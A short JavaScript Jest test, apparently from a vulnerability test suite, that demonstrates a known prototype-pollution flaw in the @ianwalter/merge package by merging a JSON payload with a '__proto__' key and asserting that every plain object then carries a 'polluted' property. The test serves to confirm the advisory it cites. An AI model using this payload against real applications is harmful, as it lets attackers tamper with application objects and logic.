//https://security.snyk.io/vuln/SNYK-JS-IANWALTERMERGE-1311022
test("prototype pollution in @ianwalter/merge", () => {
  const merge = require("@ianwalter/merge");

  expect({}.polluted).toBe(undefined);

  let EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  merge({}, EVIL_JSON);
  expect({}.polluted).toBe("yes");
});
